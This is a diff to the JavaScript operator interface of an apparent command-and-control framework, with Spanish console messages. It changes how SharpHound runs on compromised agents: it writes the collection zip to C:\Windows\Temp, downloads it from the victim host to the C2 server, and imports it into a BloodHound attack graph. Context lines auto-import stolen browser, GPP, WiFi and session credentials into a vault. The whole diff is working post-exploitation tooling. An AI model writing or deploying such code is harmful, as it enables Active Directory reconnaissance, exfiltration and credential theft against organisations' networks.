@@ -3396,11 +3396,13 @@ async function runCtxAction(act) {
     async function bhKnownDomain(agentID, requested) {
       const explicit = bhCleanDomain(requested, agentID);
       if (explicit) return explicit;
-      const agentDomain = bhCleanDomain(agents.find(a => a.id === agentID)?.domain, agentID);
-      if (agentDomain) return agentDomain;
       // The target's joined DNS domain is authoritative for this collection.
       const detected = await bhProbeDomain(agentID);
       if (detected) return detected;
+      // The agent metadata may contain a controller FQDN instead of an AD
+      // domain. Keep it as a fallback only when probing is unavailable.
+      const agentDomain = bhCleanDomain(agents.find(a => a.id === agentID)?.domain, agentID);
+      if (agentDomain) return agentDomain;
       // Imported BloodHound data is useful when probing is unavailable, but
       // it can describe another forest/domain and therefore stays a fallback.
       try {
@@ -3433,8 +3435,13 @@ async function runCtxAction(act) {
         localStorage.setItem('c2_bh_domain', domain);
         const stealthFlag = stealth ? ' --Stealth' : '';
         const ldapFlag = method === 'DCOnly' ? ' --DCOnly' : '';
-        const args = `-c ${method}${stealthFlag}${ldapFlag}${bhDomainArg(domain)} --ZipFileName bh_${method.toLowerCase()}.zip`;
-        runDotnetExec(aid, 'SharpHound.exe', args, `SharpHound -c ${method} --Domain ${domain}`, {timeoutSec: 900});
+        const outputDir = 'C:\\Windows\\Temp';
+        const zipName = `bh_${method.toLowerCase()}.zip`;
+        const args = `-c ${method}${stealthFlag}${ldapFlag}${bhDomainArg(domain)} --OutputDirectory ${outputDir} --ZipFileName ${zipName}`;
+        runDotnetExec(aid, 'SharpHound.exe', args, `SharpHound -c ${method} --Domain ${domain}`, {
+          timeoutSec: 900,
+          artifactPath: `${outputDir}\\${zipName}`,
+        });
       });
       break;
     }
@@ -3458,11 +3465,16 @@ async function runCtxAction(act) {
           return;
         }
         localStorage.setItem('c2_bh_domain', domain);
-        const parts = [`-c ${vals.collection}`, bhDomainArg(domain).trim(), '--ZipFileName bh_out.zip'];
+        const outputDir = 'C:\\Windows\\Temp';
+        const zipName = 'bh_out.zip';
+        const parts = [`-c ${vals.collection}`, bhDomainArg(domain).trim(), '--OutputDirectory', outputDir, '--ZipFileName', zipName];
         if (vals.ldapuser) parts.push(`--LDAPUser ${vals.ldapuser}`);
         if (vals.ldappass) parts.push(`--LDAPPass ${vals.ldappass}`);
         if (vals.stealth)  parts.push('--Stealth');
-        runDotnetExec(aid, 'SharpHound.exe', parts.join(' '), `SharpHound -c ${vals.collection}`, {timeoutSec: 900});
+        runDotnetExec(aid, 'SharpHound.exe', parts.join(' '), `SharpHound -c ${vals.collection}`, {
+          timeoutSec: 900,
+          artifactPath: `${outputDir}\\${zipName}`,
+        });
       });
       break;
     }
@@ -9901,6 +9913,56 @@ async function fetchSCFile(name) {
   throw new Error(`File not found: ${name} (not in uploads nor in payloads)`);
 }
 
+// Download a collector artifact from the agent and import it into the graph.
+// DOTNET_EXEC writes SharpHound output on the target, so displaying stdout
+// alone is not enough to make the menu action equivalent to Operator/BloodHound.
+async function bhDownloadAndImport(agentID, remotePath, label) {
+  const filename = String(remotePath || '').split(/[\\/]/).pop();
+  if (!filename) return false;
+  addConsoleOutputForAgent(agentID, `[*] Descargando ${filename} desde el agente…`, '', null);
+  const queued = await api('POST', `/api/agents/${agentID}/task`, {
+    type: 'DOWNLOAD', args: remotePath,
+  });
+  if (!queued?.ok || !queued.data?.task_id) {
+    addConsoleOutputForAgent(agentID, '', `No se pudo descargar ${filename}`, null);
+    return false;
+  }
+  const result = await awaitTaskResult(queued.data.task_id, agentID, 300000);
+  if (!result || result.error) {
+    addConsoleOutputForAgent(agentID, '', result?.error || `Timeout descargando ${filename}`, null);
+    return false;
+  }
+
+  // The upload is handled by a separate HTTP request from the agent. Give it
+  // a short grace period before asking the import endpoint to read the file.
+  let uploaded = false;
+  for (let i = 0; i < 10; i++) {
+    const files = await api('GET', '/api/uploads');
+    uploaded = !!(files?.ok && (files.data || []).some(f =>
+      f.agent_id === agentID && f.filename === filename));
+    if (uploaded) break;
+    await sleep(1000);
+  }
+  if (!uploaded) {
+    addConsoleOutputForAgent(agentID, '', `${filename} no apareció en uploads`, null);
+    return false;
+  }
+
+  const imported = await api('POST', '/api/bloodhound/import-local', {
+    agent_id: agentID, filename,
+  });
+  if (!imported?.ok) {
+    addConsoleOutputForAgent(agentID, '', imported?.error || `No se pudo importar ${filename}`, null);
+    return false;
+  }
+  const nodes = imported.data?.nodes ?? 0;
+  const edges = imported.data?.edges ?? 0;
+  addConsoleOutputForAgent(agentID, `[✓] ${label || 'BloodHound'} completado: ${nodes} nodos, ${edges} aristas`, '', null);
+  toast(`BloodHound importado: ${nodes} nodos, ${edges} aristas`, 'green');
+  bhInit();
+  return true;
+}
+
 // ── AD attack helper — fetch .NET assembly and queue DOTNET_EXEC ──────────────
 // Returns the task_id on success, null on failure.
 async function runDotnetExec(agentID, toolName, toolArgs, label, options = {}) {
@@ -9926,10 +9988,13 @@ async function runDotnetExec(agentID, toolName, toolArgs, label, options = {}) {
   addConsoleOutputForAgent(agentID, `[+] ${lbl} → task #${tid}`, '', null);
   if (tid) {
     if (Number(options.timeoutSec) > 120) {
-      addConsoleOutputForAgent(agentID, `[~] ${lbl} puede tardar varios minutos; la tarea sigue activa mientras SharpHound enumera LDAP…`, '', null);
+      addConsoleOutputForAgent(agentID, `[~] ${lbl} encolado; esperando el resultado del agente…`, '', null);
     }
     const pollMs = Number(options.timeoutSec) > 0 ? (Number(options.timeoutSec) + 30) * 1000 : 120000;
-    pollResult(tid, agentID, pollMs);
+    pollResult(tid, agentID, pollMs, {
+      label: lbl,
+      artifactPath: options.artifactPath || '',
+    });
   }
   return tid;
 }
@@ -10937,7 +11002,7 @@ function ishellUpdateUI(agentID) {
   }
 }
 
-async function pollResult(taskID, agentID, timeoutMs = 120000) {
+async function pollResult(taskID, agentID, timeoutMs = 120000, meta = {}) {
   const aid = agentID || activeAgent?.id;
   if (!aid) return;
   const key = `${aid}-${taskID}`;
@@ -10973,6 +11038,15 @@ async function pollResult(taskID, agentID, timeoutMs = 120000) {
         const shown = out || (err ? '' :
           (r.data.task_type === 'SHELL' ? '[empty output]' : '[done]'));
         addConsoleOutputForAgent(aid, shown, err, r.data.created_at);
+        const taskFailed = !!err || /\[!\]\s*(?:fork-and-run timeout|fork-and-run child exited|assembly threw|invoke_3 hr=)/i.test(out);
+        if (meta.label && !meta.artifactPath) {
+          addConsoleOutputForAgent(aid,
+            taskFailed ? `[!] ${meta.label} falló` : `[✓] ${meta.label} completado`,
+            '', null);
+        }
+        if (!taskFailed && meta.artifactPath) {
+          await bhDownloadAndImport(aid, meta.artifactPath, meta.label);
+        }
         // Auto-import GPP / WiFi / browser credentials to vault
         const _vaultTypes = ['BROWSER_CREDS', 'GPP_PASSWORDS', 'WIFI_CREDS', 'SESSION_CREDS'];
         if (_vaultTypes.includes(r.data.task_type) && out && !err) {
